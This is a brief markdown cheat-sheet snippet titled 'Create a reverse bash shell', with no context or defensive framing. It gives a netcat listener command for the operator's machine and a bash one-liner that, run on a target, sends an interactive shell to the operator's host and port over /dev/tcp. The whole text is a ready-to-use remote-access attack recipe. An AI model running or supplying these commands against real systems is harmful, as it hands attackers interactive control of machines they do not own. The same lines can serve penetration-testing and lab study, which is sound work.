### Create a reverse bash shell

Setup listener on your local machine
`sudo nc -lvn 9898`

Connect to the listener from the target
`bash -c 'bash -i >& /dev/tcp/your-ip/your-port 0>&1'`